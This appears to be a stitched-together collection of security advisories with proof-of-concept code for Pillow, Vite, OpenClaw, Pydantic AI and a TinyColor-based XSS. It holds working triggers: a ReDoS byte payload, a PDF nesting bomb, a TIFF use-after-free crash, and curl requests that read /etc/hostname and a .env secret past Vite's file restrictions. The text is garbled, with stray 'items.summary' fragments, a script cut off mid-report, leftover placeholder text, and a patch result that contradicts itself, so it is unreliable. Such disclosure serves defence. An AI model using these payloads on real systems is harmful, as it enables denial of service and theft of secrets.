``` ============================================================================ ReDoS in XbmImagePlugin: 512-byte file stalls Image.open() for minutes Location: src/PIL/XbmImagePlugin.py:58 in XbmImageFile._open() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 512-byte file makes Pillow's `Image.open()` spend about six minutes of processor time on one core before it gives up with `UnidentifiedImageError`. Anyone who can hand bytes to an application that opens images with Pillow's default settings can trigger this, for example through an upload form, a thumbnailer, or a service that checks whether a blob is an image. A few such files sent at once can tie up a typical pool of worker processes. The cause is the `xbm_head` regular expression in `src/PIL/XbmImagePlugin.py:32-40`, which `XbmImageFile._open()` (line 58) runs over the first 512 bytes of any stream whose prefix starts with `#define`. Several adjacent parts of the pattern can match the same characters. `[ \t]+` overlaps with `.*` in the width and height lines and with `[^_]*` in the optional hotspot lines, and `[\r\n]+` closing the hotspot group overlaps with the following `[\000-\377]*`. The header sets a run of k spaces after each `#define` and a run of k line terminators after `_y_hot`, then omits the `[]` after `_bits`. That forces Python's backtracking matcher to try every way of splitting those runs and rescan the remaining bytes each time. The cost grows roughly as k to the fifth power: k = 60 measured 375 s, while a well-formed XBM of the same size opens in about 40 ms. Because this happens before any format is identified, none of Pillow's size, pixel-count or decompression-bomb limits apply, and upload size limits do not help because the file is tiny. `ImageFile.Parser.feed()` repeats the cost on every chunk until the stream is identified. The only existing mitigation is passing a `formats=` allowlist that excludes `"XBM"`. The attached reproducer opens the same header with and without the trailing `[]`. The valid version opens as XBM in 52 ms. The broken version takes 0.1 s, 0.75 s, 3.0 s and 8.6 s at k = 10, 15, 20 and 25, and the slow k = 60 case is not run. This is the same class of bug as CVE-2021-25292 in `PdfParser`, but in a different plugin and reachable from plain `Image.open()`. ## Details `XbmImageFile._open()` identifies an XBM file by running the module-level regex `xbm_head` over the first 512 bytes of the stream. The pattern has several adjacent quantifier pairs that can consume the same characters, followed by a `[\000-\377]*_bits\[]` tail that rescans the rest of the buffer for every way of splitting them. A 512-byte input built to exercise all of them and then fail the final literal keeps `Image.open()` in `xbm_head.match()` for minutes before it raises `UnidentifiedImageError`. This 512-byte input (k = 60) takes 375 s of CPU in `Image.open(io.BytesIO(data))` with default settings, measured on the stock build at this commit: ```python k = 60 data = b"#define" + b" "*k + b"_width 1\r" data += b"#define" + b" "*k + b"_height 1\r" data += b"#define" + b" "*k + b"_x_hot 1\r" data += b"#define" + b" "*k + b"_y_hot 1" + b"\r"*k data += b"_bits" # no "[]": the final literal never matches data += b"A" * (512 - len(data)) # pad to the 512 bytes _open() reads ``` Calling `XbmImagePlugin.xbm_head.match(data)` directly gives the same picture: k = 10 → 0.11 s, k = 15 → 0.76 s, k = 20 → 3.0 s, k = 25 → 8.5 s, k = 30 → 19.9 s (roughly ×27 per doubling of k, i.e. about k^4.7). A well-formed 512-byte XBM matches in 10 µs and opens and loads through `Image.open()` in ~40 ms including plugin import; the same k = 60 header with `_bits[]` present matches in 5 µs. The regex, `src/PIL/XbmImagePlugin.py:32`: ```python xbm_head = re.compile( rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` and the only call site, `src/PIL/XbmImagePlugin.py:58`: ```python def _open(self) -> None: … m = xbm_head.match(self.fp.read(512)) if not m: msg = "not a XBM file" raise SyntaxError(msg) ``` For a well-formed header (`#define im_width 8\n…static char im_bits[] = {`) each `[ \t]+` eats the single space, `.*`/`[^_]*` eat the identifier prefix, and `[\000-\377]*_bits\[]` finds the literal on its first backward scan, so the match is linear. The crafted header diverges at every one of those points: - `[ \t]+.*_width` and `[ \t]+.*_height`: the run of k spaces after `#define` can be split between `[ \t]+` and `.*` in k ways, all leading to the same continuation. Factor k each. (The choice of `\r` terminators is incidental: the same header with `\n` terminators is equally slow.) - `[ \t]+[^_]*_x_hot` and `[ \t]+[^_]*_y_hot` inside the optional `hotspot` group: `[^_]*` also matches spaces, so the same k-way split exists twice more. Factor k each. These two lines are essential: without them the same input is rejected in about 10 ms. - `[\r\n]+` closing the `hotspot` group, followed by `)?` and `[\000-\377]*`: the run of k `\r` bytes after `_y_hot 1` can be divided between `[\r\n]+` and `[\000-\377]*` in k ways. Factor k. - `[\000-\377]*_bits\[]`: for every combination above, the engine swallows the remaining ~150 bytes of padding and walks back looking for `_bits[]`. The input contains `_bits` but never `[]`, so this always fails and every combination is visited. CPython's `re` is a backtracking engine without memoisation, so the total work is on the order of k^5 × (512 − header length) steps — about 10^11 for k = 60, consistent with the measured 375 s. The 512-byte read caps k (5k + ~60 ≤ 512), so the cost per `open()` is bounded, but the bound is minutes of CPU. The path is the default one. `Image.open()` (`src/PIL/Image.py:3719`) reads a 16-byte prefix and offers it to every registered plugin's accept hook; `XbmImagePlugin._accept()` (`src/PIL/XbmImagePlugin.py:43`) returns true for anything whose left-stripped prefix starts with `#define`, and `_open()` then runs the regex. No size, pixel-count or decompression-bomb check can apply before this point because nothing has been parsed yet, and since the match ultimately fails the file is never identified, so the only outcome for the caller is `UnidentifiedImageError` after the delay. File name and extension are irrelevant because dispatch is by content. A `faulthandler` stack dump taken 20 s into the call shows the interpreter at `XbmImagePlugin.py:58 in _open` ← `ImageFile.py:154 in __init__` ← `Image.py:3699 in _open_core` ← `Image.py:3719 in open`. `ImageFile.Parser.feed()` (`src/PIL/ImageFile.py:584`) amplifies this further: until the stream is identified it calls `Image.open()` on all accumulated data at every `feed()`, so an application feeding the stream in chunks pays the regex cost once per chunk (measured: k = 15 header fed in 8 chunks → 4.6 s versus 0.76 s for a single `open()`). ## Impact Anyone who can get 512 bytes in front of `Image.open()` — an upload endpoint, thumbnailer, or any service that uses Pillow to sniff whether a blob is an image — pins one CPU core of the handling process for roughly six minutes per request with the default plugin set and default limits. Nothing large is allocated and no `DecompressionBombWarning`/`Error` fires; application-side upload size limits do not help because the file is tiny, and `Image.MAX_IMAGE_PIXELS` is never consulted because no image is ever identified. A handful of concurrent requests is enough to exhaust a typical worker pool. The per-call cost is bounded by the 512-byte header read, so this is a CPU-exhaustion denial of service of the handling process rather than an infinite loop. Applications that pass an explicit `formats=` allowlist to `Image.open()` that excludes `"XBM"` are not affected. This is the same bug class as CVE-2021-25292 (catastrophic backtracking in the `PdfParser` regexes, fixed in 8.1.1) and CVE-2021-23437 (`ImageColor.getrgb` ReDoS, fixed in 8.3.2), in a different plugin; unlike the PDF case it is reached from plain `Image.open()` on any byte stream. ## Reproducing `repro` is a single Python script. It uses the installed Pillow through the public `Image.open()` API and needs no rebuild. Each input is the 512-byte header from Details: four `#define` lines with k spaces after `#define`, lines ending in `\r`, k `\r` bytes after `_y_hot 1`, padding with `A` up to the 512 bytes that `_open()` reads. The only thing that changes between inputs is the tail: `_bits[]` (valid) or `_bits` (the final literal can never match). 1. **Control.** Opens the k = 60 header with the tail `_bits[]`. The regex matches on its first try and Pillow reports `XBM (1, 1)` in about 50 ms. This shows that the same bytes are only slow when the match has to fail. 2. **Attack.** Opens the header with the tail `_bits` at k = 10, 15, 20 and 25. Each one raises `UnidentifiedImageError`, after about 0.1 s, 0.75 s, 3.0 s and 8.6 s. The time grows polynomially, not linearly. The k = 60 input from Details, which takes about 6 minutes of CPU, is not run. Expected output on this commit: ``` control k=60 '_bits[]': XBM (1, 1) in 0.052s attack k=10 '_bits' : UnidentifiedImageError in 0.105s attack k=15 '_bits' : UnidentifiedImageError in 0.748s attack k=20 '_bits' : UnidentifiedImageError in 3.024s attack k=25 '_bits' : UnidentifiedImageError in 8.561s BUG ``` The script prints `BUG` only when all of these hold: - the control header opened as `XBM` in under 1 s; - the k = 25 attack input took more than 2 s; - the k = 25 attack input took more than 5 times as long as the k = 15 one, i.e. the cost grows super-linearly in k. Otherwise it prints `OK`. With the attached patch applied, every attack input is rejected at once, so the script prints `OK`. ## Suggested fix The attached patch removes the overlap between `[ \t]+` and the quantifier that matches the identifier prefix in `xbm_head` (`src/PIL/XbmImagePlugin.py:32-40`), so the whitespace after `#define` can be consumed in exactly one way and the identifier cannot run across line terminators. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # XbmImagePlugin.xbm_head catastrophic backtracking, reached from Image.open() # on a <=512-byte stream. items.summary: ``` ============================================================================ Quadratic GIF comment concatenation allows DoS in Image.open() Location: src/PIL/GifImagePlugin.py:266 in GifImageFile._seek() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Opening a crafted GIF file with `Image.open()` takes time that grows with the square of the file's size, so anyone who can submit an image to a service that uses Pillow can keep one worker busy at full processor load for a long time with a small file. A 2 MB file takes about 5 seconds to open, a 4 MB file about 35 seconds, and an 8 MB file about 3 minutes. An ordinary GIF of the same size opens in well under a second. The cost is paid inside `Image.open()` itself, with default settings, before the application has seen the image's size or format. The bug is in `GifImageFile._seek()` in `src/PIL/GifImagePlugin.py`, which builds `info["comment"]` by appending to an immutable `bytes` object with no size limit. It appends once per 255-byte sub-block (`comment += block`, line 261) and once per comment extension (`info["comment"] += b"\n" + comment`, line 266). Each append copies everything collected so far. A file made of many tiny comment extensions forces a full re-copy for each one. Because `_open()` ends with `self._seek(0)`, any code that only opens an uploaded file to identify it, read its dimensions, or make a thumbnail pays the full cost. The decompression-bomb check does not help, since the image is 1×1. Memory use stays linear, so the effect is processor exhaustion and latency, bounded by whatever upload size the service allows (about 1 second at 1 MB). This is the same kind of issue as the EPS open-phase slowdown fixed as CVE-2021-28677, here in the GIF comment handling. The quadratic pattern was introduced in commit b2b737b68b06 ("Allow arbitrary number of comment extension subblocks", November 2018) and has shipped since Pillow 5.4.0. The attached script builds 2 MB and 4 MB test files and compares each against a byte-identical control whose extensions are labelled as plain text instead of comment. The 4 MB comment file took about 34 seconds to open, against 0.26 seconds for its control. A patch that collects the pieces in a list and joins them once is also attached. ## Details `GifImageFile._seek()` collects GIF comment extensions into `info["comment"]` using `bytes` concatenation, once per 255-byte sub-block and once per comment extension, with no limit on the total. `bytes` is immutable, so every `+=` allocates a new object and copies everything accumulated so far; the work done by `Image.open()` is therefore quadratic in the amount of comment data in frame 0. A 1×1 GIF89a whose body is nothing but the 5-byte comment extension `21 FE 01 41 00` repeated makes this directly observable. `Image.open(BytesIO(data))` on such a file, stock build at this commit, 2-CPU machine: | file size | comment extensions (`21 FE …`) | same bytes labelled plain-text extension (`21 01 …`) | |---|---|---| | 1 MB | 1.2 s | 0.09 s | | 2 MB | 4.9 s | 0.13 s | | 4 MB | 35 s | 0.26 s | | 8 MB | 183 s | — | The control column is the identical byte stream with the extension label changed from `0xFE` to `0x01`; it goes through the same loop and the same `self.data()` reads but is discarded instead of concatenated, and scales linearly. No `load()` is needed and no warning or exception is raised; `im.info["comment"]` simply ends up holding the multi-megabyte blob. The code, `src/PIL/GifImagePlugin.py:229-281` (trimmed): ```python elif s == b"!": s = self.fp.read(1) block = self.data() … elif s[0] == 254: # # comment extension # comment = b"" # Read this comment block while block: comment += block # :261 one copy per sub-block block = self.data() if "comment" in info: # If multiple comment blocks in frame, separate with \n info["comment"] += b"\n" + comment # :266 one copy per extension else: info["comment"] = comment s = b"" continue … while self.data(): # every other extension: read and drop pass ``` `self.data()` (`:97-102`) reads one length byte and then that many bytes, so each call is cheap and bounded; the cost is entirely in the two `+=` lines. For a single comment extension of N bytes delivered as N/255 sub-blocks, line 261 copies about N²/510 bytes in total (4 MB → 2.3 s, 8 MB → 9.5 s, 16 MB → 38 s measured). Splitting the same data into many small comment extensions is worse, because line 266 re-copies the whole of `info["comment"]` once per extension: with 1-byte extensions a file of F bytes causes roughly F²/25 bytes of copying, which is the table above (growth ×4–7 per doubling once the buffer outgrows the CPU caches). This runs during `Image.open()`: `_open()` ends with `self._seek(0)` (`:135`), so any application that merely opens an uploaded file to identify it, read its size, or thumbnail it pays the full cost before it has made any decision about the image. `Image._decompression_bomb_check` is not involved (the image is 1×1), and unlike PNG text chunks (`PngImagePlugin.MAX_TEXT_CHUNK` / `MAX_TEXT_MEMORY`) there is no cap on GIF comment size. Later frames repeat the same loop for their own comments via `seek()` / `n_frames`. With both `+=` sites replaced by list-append and a single `b"".join()` (as in the attached patch), the same 16 MB single-extension file opens in 0.03 s, confirming the concatenation is the whole cost. ## Impact Anyone who can get a GIF to a service that calls `PIL.Image.open()` on it — avatar/media uploads, thumbnailers, format sniffing, anything using `ImageOps`/`thumbnail()` on user files — can pin one worker process at 100 % CPU for about 5 s with a 2 MB file, 35 s with a 4 MB file and 3 minutes with an 8 MB file, under default settings, with the time growing quadratically in the permitted upload size. A benign GIF of the same size opens in well under a second, so request-cost assumptions based on file size do not hold. Memory use is only linear (the comment is retained in `im.info["comment"]`), so the effect is CPU/latency denial of service of the worker pool rather than memory exhaustion; a handful of concurrent uploads is enough to saturate a typical pool. Upload size limits bound it (≈1 s at 1 MB). This is the same shape as CVE-2021-28677 ("EPS DOS on _open", `docs/releasenotes/8.2.0.rst`), where a quadratic method of accumulating data in the open phase, before the image was accepted, was treated as a denial-of-service vulnerability; here the format is GIF and the accumulator is the comment extension. The quadratic accumulation was introduced in `b2b737b68b06` ("Allow arbitrary number of comment extension subblocks", 2018-11-27), first released in Pillow 5.4.0. ## Reproducing `repro` is a single Python script that uses the installed Pillow. ### Summary

On `main`, even with the guard in #9725, it's possible to have these decoders read 1 to 3 bytes past the end of the passed buffer with a suitable width/height.

### Details

`ImagingRawDecode` and the `P;2L` / `P;4L` unpackers disagree about how many bytes a line of data occupies.

The raw decoder derives the line size from the bits per pixel

```c
state->bytes = (state->xsize * state->bits + 7) / 8;
```

and uses it both for the bounds check and to advance to the next line. For `P;2L` and `P;4L`, `bits` is 2 and 4 respectively.

But these two rawmodes are not packed pixels but 2 or 4 *bit planes*, each padded to a whole number of bytes. `unpackP2L` computes `s = (pixels + 7) / 8` and reads plane *k* at offset `k * s`, and `unpackP4L` does the same across four planes. Their real footprint is therefore `planes * ((xsize + 7) / 8)`.

For some widths, padding each plane separately makes this footprint larger than `state->bytes`. For example, at width 1, the decoder accounts for one byte, while the unpackers read two or four bytes. The decoder accepts data that is too short for the last line and on the other hand advances to subsequent lines by less than a line, so every line after the first is also read from the wrong offset.

#9725's check is misshapen for this:

* It can reject data of the right length: 8x1 `P;2L` image is 2 bytes but is not accepted.
* It still accepts buffers shorter than the unpackers require for a given image shape.
* It measures the length with `len(data)`, which is an element count rather than a byte count; e.g. `memoryview(array("I", [0,0,0,0,0]))` (20 bytes) is rejected while `mv.tobytes()` is accepted.

### PoC ( `ghsa_p2l_p4l.py`)

```python
from array import array
from PIL import Image

# 1 byte past
Image.frombytes("P", (1, 4), array("B", [0] * 4), "raw", "P;2L")

# 3 bytes past
Image.frombytes("P", (1, 8), array("B", [0] * 8), "raw", "P;4L")
```
is the almost-simplest reproducer.

(`array` is needed to get ASan to reliably scream, but the overread is observable with e.g. bytes literals. Python allocates `bytes`es with an extra trailing null byte, from an arena by default to boot, so ASan doesn't see the overread.)

### Impact

Only a very specific use case is affected: `Image.frombytes()` or `Image.frombuffer()` calls of the shape above.
The PCX decoder, which is the only Pillow-internal user of the P;2L and P;4L unpackers, already re-packs PCX rows into a format where overreads aren't an issue.

### Summary
`PdfParser`'s `get_value()` can recurse without any limit and crash with an uncaught `RecursionError`. It is reachable through `Image.save(im, fp=<pdf>, format="PDF", append=True)` when the existing PDF file is attacker-controlled. This is the same class of bug as https://github.com/advisories/GHSA-r73j-pqj5-w3x7 (the /Prev trailer chain loop, fixed earlier this year), in the same file, but in two different functions that fix did not touch.

### Details
**`get_value()` in `src/PIL/PdfParser.py`**

This is a classmethod that takes `max_nesting: int = -1` and has a guard:

```python
if max_nesting == 0:
    return None, None
```

Every recursive call (nested arrays, dictionaries, indirect object definitions) passes `max_nesting=max_nesting - 1`. Since the default and every call site start at -1, this only ever counts down further negative: -1, -2, -3, and so on. It never equals exactly 0, so the guard never runs. A PDF object with a value nested a few thousand levels deep is enough to hit Python's recursion limit. It does not even need a valid `/Pages` tree, since `read_pdf_info()` parses the `/Root` object's own dictionary first, before checking anything else.

This advisory reports a single vulnerability: an ineffective recursion-depth guard in `PdfParser.get_value()` (the sentinel  `-1`  default never reaches the `== 0` check). The mention of GHSA-r73j-pqj5-w3x7 is comparative context for an already-fixed, already-CVE'd bug in a different function — it is not a second vulnerability being reported. The three trigger paths (nested arrays/dicts/indirect objects) are not independently fixable; they share one root cause and one fix location in  get_value() .

### Steps to reproduce
Both PDFs below are plain text, built directly in Python, no PDF library needed.

```python
from PIL.PdfParser import PdfParser

def build_pdf(root):
    out = bytearray(b"%PDF-1.4\n")
    offset = len(out)
    out += f"1 0 obj\n".encode()
    out += root
    out += b"\nendobj\n"
    out += b"xref\n"
    out += f"0 2\n".encode()
    out += b"0000000000 65535 f \n"
    out += f"{offset:010d} 00000 ".encode() + b"n \n"
    xref_offset = len(out)
    out += b"xref\n"
    out += f"0 2\n".encode()
    out += b"0000000000 65535 f \n"
    out += f"{offset:010d} 00000 ".encode() + b"n \n"
    out += b"trailer\n"
    out += f"<< /Size 2 /Root 1 0 R >>\n".encode()
    out += b"startxref\n"
    out += f"{xref_offset}\n".encode()
    out += b"%%EOF"
    return bytes(out)

bomb = b"[" * 3000 + b"]" * 3000
root = b"<< /Type /Catalog /Pages 2 0 R /Bomb " + bomb + b" >>"
with open("nesting_bomb.pdf", "wb") as f:
    f.write(build_pdf(root))

PdfParser("nesting_bomb.pdf")     # raises RecursionError
```

Expected: a clean `PdfFormatError`.

Actual: raises a raw `RecursionError: maximum recursion depth exceeded`.

### Impact
- Availability: an attacker who controls the content of a PDF file that an application later appends an image page to (`Image.save(..., format="PDF", append=True)`) can crash that request with a RecursionError, using a file of a few hundred bytes.
- Confidentiality: none.
- Integrity: none.
- Pillow cannot open PDFs for reading through `Image.open()`. `PdfParser` is only reached through the append-mode save path, so the app has to be doing that specific thing (for example, stamping or watermarking an existing PDF) for this to matter.

### Summary
Saving an image as TIFF to an in-memory buffer can trigger a heap use-after-free if libtiff rejects a tag at encode time. When `TIFFWriteScanline` fails, the encoder frees its output buffer but leaves the libtiff handle open. Later, when the encoder object is torn down, `TIFFClose` flushes buffered bytes through the write callback and writes into the freed buffer. An application that re-encodes attacker-influenced images to TIFF in memory can be crashed and is a candidate for remote code execution.

### Details
The failure path in `ImagingLibTiffEncode` frees `clientstate->data` for the in-memory case but does not close the TIFF or null `clientstate->tiff` (the file-descriptor branch just above it does set `tiff = NULL`):

- `src/libImaging/TiffDecode.c:1041-1046`

Teardown then calls `ImagingLibTiffEncodeCleanup`, which runs `TIFFClose(tiff)` because `tiff` is still set:

- `src/encode.c:99-101`
- `src/libImaging/TiffDecode.c:955`

`TIFFClose` flushes through `_tiffWriteProc`, which reallocs and memcpys into the freed `state->data`:

- `src/libImaging/TiffDecode.c:103-115`

The Predictor tag is a convenient trigger: the floating-point predictor (value 3) is invalid for integer sample data, so libtiff aborts the write.

### PoC
```python
import io
from PIL import Image

# In-memory TIFF re-encode. libtiff rejects Predictor=3 (floating point) on integer
# data, so TIFFWriteScanline fails. The encoder frees clientstate->data but leaves the
# TIFF open; cleanup's TIFFClose then writes through the callback into the freed buffer.
im = Image.new("L", (64, 64))
buf = io.BytesIO()
im.save(buf, format="TIFF", compression="tiff_lzw", tiffinfo={317: 3})  # 317 = Predictor
```

Run it:
```
$ python 01_poc.py
PredictorSetup: Floating point "Predictor" not supported with 1 data format.
OSError: encoder error -2 when writing image file
Segmentation fault (core dumped)
```

Observed on a source build of commit `3e2ab96` with libtiff. The process aborts during cleanup after the encoder error. Depending on heap state the same run sometimes reports `corrupted double-linked list` instead of a segfault; both are the same write into freed memory.

Under AddressSanitizer (build with `-fsanitize=address`), relevant frames:
```
==ERROR: AddressSanitizer: heap-use-after-free on address 0x7ef737b48804
WRITE of size 4 at 0x7ef737b48804 thread T0
    #1 _tiffWriteProc                 src/libImaging/TiffDecode.c:115
    #3 TIFFFlush                      libtiff.so.6
    #5 TIFFClose                      libtiff.so.6
    #6 ImagingLibTiffEncodeCleanup    src/libImaging/TiffDecode.c:955
    #7 _dealloc                       src/encode.c:100
freed by thread T0 here:
    #1 ImagingLibTiffEncode           src/libImaging/TiffDecode.c:1045
    #2 _encode                        src/encode.c:139
previously allocated by thread T0 here:
    #1 ImagingLibTiffEncodeInit       src/libImaging/TiffDecode.c:863
    #2 PyImaging_LibTiffEncoderNew    src/encode.c:757
SUMMARY: AddressSanitizer: heap-use-after-free src/libImaging/TiffDecode.c:115 in _tiffWriteProc
```
The buffer allocated in `ImagingLibTiffEncodeInit` is freed in `ImagingLibTiffEncode`, then written by `_tiffWriteProc` during the `TIFFClose` flush that runs from the encoder's `_dealloc`.

### Impact
Use-after-free in a C extension. Affects any service that converts or thumbnails untrusted images to TIFF in memory (a `BytesIO` or other non-seekable target). Result is a crash and possible memory corruption leading to code execution.

### Summary

The content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was possible to be returned.

The content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `<project-root>/etc/hosts` could make Vite return the host's `/etc/hosts` file.

### Impact

Only apps that meet all of the following conditions are affected:

- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))
- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host
- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)
- the dev server is not running on Windows

### Details

When Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.

For a later request to `/@fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.

### PoC
The following example requires Linux with a readable `/etc/hostname`:
```bash
$ mkdir vite-safe-module-path-poc
$ cd vite-safe-module-path-poc
$ npm init -y
$ npm install vite@8.3.1
$ mkdir -p etc
$ echo 'PROJECT-DECOY\n' > etc/hostname
$ echo 'import "./etc/hostname"\n' > main.js
$ npx vite --host 127.0.0.1
```

In another terminal:
```bash
$ curl -o /dev/null -s -w '%{http_code}\n' http://127.0.0.1:5173/main.js
200
$ curl -sS -o response -w '%{http_code}\n' http://127.0.0.1:5173/@fs/etc/hostname
200
$ cmp -s response /etc/hostname && echo 'response matches host file'
response matches host file
```

### Summary

Browser CDP discovery could accept blocked WebSocket URLs. In affected versions, a lower-trust caller or configured input path could reach network destinations that should have been blocked by OpenClaw policy.

This advisory is scoped to the named feature and configuration. It does not change OpenClaw's trusted-operator model: authenticated Gateway operators, installed plugins, and intentional local execution surfaces remain trusted unless a separate policy, approval, allowlist, sandbox, or auth boundary is crossed.

### Impact

When the affected feature is enabled and reachable, this could reach network destinations that should have been blocked by OpenClaw policy. Practical impact depends on the operator's configuration and whether lower-trust input can reach that path.

### Patched Versions

The first stable patched version is `2026.6.6`.

### Mitigations

Upgrade to a patched OpenClaw release when one is listed. Before upgrading, restrict the affected feature to trusted operators or disable it when it is not needed. As general hardening, keep channel and tool allowlists narrow, avoid sharing one Gateway between mutually untrusted users, and disable the affected feature when it is not needed.

### Summary

The first 4 bytes of files outside of `server.fs` setting can be returned to the browser by a request containing `?vite-wasm-instance`.

### Impact

 Only apps that match one of the following conditions are affected:

- explicitly expose the Vite dev server to the network using `--host` or the [`server.host`](https://vite.dev/config/server-options#server-host) option
- there's a file that has a sensitive information in **the first 4 bytes**
- uses Node.js or Deno to run Vite (if Bun is used, it is not affected)

### Details
Requests containing the `?vite-wasm-instance` query are handled by the internal Wasm plugin's `load` hook. The hook removes the query and reads the resulting path directly from disk, but the `server.fs` checks were not applied.

After reading the file, Vite attempts to parse it as WebAssembly. When that parse fails, Node and deno throws an error that contains the first 4 bytes of the file.

### PoC

Create a denied file and start an affected Vite dev server:

```bash
echo 'SECRET_KEY=abc123\n' > .env
npm run dev
curl 'http://localhost:5173/.env?vite-wasm-instance'
```

This will show
```
Failed to parse WASM file "<root>/.env": WebAssembly.compile(): expected magic word 00 61 73 6d, found 53 45 43 52 @+0
```

items.summary:
### Summary

A client that can submit message history to a Pydantic AI UI adapter can reference arbitrary files in the application's model-provider or cloud-storage account. The server forwards the reference to the model provider, which fetches it using the server's own credentials, allowing the client to read files it should not have access to.

### Details

UI adapters reconstruct file parts from client-submitted message history and forward them to the model provider. File **URL** parts are validated against a scheme allowlist before being forwarded, but `UploadedFile` references — which point to a file by provider file ID or cloud-storage URI (e.g. `s3://…`, `gs://…`) — were forwarded without validation.

Because the provider resolves an `UploadedFile` using the server-side identity (IAM role, service account, or provider API key) rather than the client's, a client that crafts message history containing an attacker-chosen `UploadedFile` can cause the server to read objects belonging to its own account or to other tenants, given a referenceable identifier.

### Impact

Applications that pass untrusted client-submitted message history to an agent through a UI adapter (such as the Vercel AI adapter). Exploitation requires the attacker to reference a valid file identifier; depending on how the application names objects, such identifiers are not always unguessable.

### Patches

Upgrade to `1.106.0` (1.x) or `2.0.0b6` (the 2.x beta line), which validate `UploadedFile` references on client-submitted messages the same way file URLs are validated.

### Workarounds

If users cannot upgrade, do not pass untrusted client-submitted message history to the agent, or strip `UploadedFile` parts from incoming messages before running the agent.
items.title: Pydantic AI: Unvalidated UploadedFile references in UI adapters allow server-side file access using the application's credentials

items.summary: ### Summary The color field accepts any string that *begins* with a valid `rgb()` / `hsl()` color, because `TinyColor.isValid` does not anchor its match at the end of the string. An authenticated user with edit rights can store arbitrary HTML after a valid color prefix. When the stored value is rendered , the payload executes, resulting in stored XSS. ### Details Server-side validation of the color field relies on TinyColor: ```js const { TinyColor } = require('@ctrl/tinycolor'); if (!new TinyColor(value).isValid) throw self.apos.error('invalid'); ``` TinyColor's `rgb`/`hsl` matchers are not anchored at the end of the string, while hex matchers are. Tested with @ctrl/tinycolor | Input | `isValid` | |---|---| | `rgb(1,2,3)` | `true` | | `rgb(1,2,3)` | `true` | | `hsl(0,100%,50%);--x:1}` | `true` | | `#ff0000` | `false` | The value is saved to MongoDB unchanged (not normalized to hex8). ### Relation to GHSA-97v6-998m-fp4g GHSA-97v6 addressed CSS custom property injection escaping a ``" OR "a separate HTML sink at X is exploitable"]. Fixing the validation (requiring the full string to be a color, or storing only TinyColor's normalized output) would close both. ### Impact Any user with edit permission can plant persistent JavaScript that runs in the browser of visitors and administrators viewing the affected page, enabling session hijacking and actions as an admin. ### Suggested fix Reject values unless the entire string is a valid color, e.g. normalize on save: ```js const c = new TinyColor(value); if (!c.isValid) throw self.apos.error('invalid'); value = c.toHex8String(); // store only normalized output ```
